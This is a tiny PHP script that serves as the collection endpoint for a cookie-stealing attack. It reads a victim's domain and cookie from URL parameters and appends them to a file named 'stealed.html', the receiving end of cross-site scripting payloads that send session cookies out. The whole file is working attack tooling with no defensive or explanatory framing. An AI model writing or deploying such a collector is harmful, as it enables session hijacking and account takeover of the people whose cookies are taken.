<?php 
$txt = "DOMAIN --> ".$_GET['domain']." | "."COOKIE ->".$_GET['cookie']."<br>";
$myfile = fopen("stealed.html", "a");
fwrite($myfile, $txt);
fclose($myfile);
?>


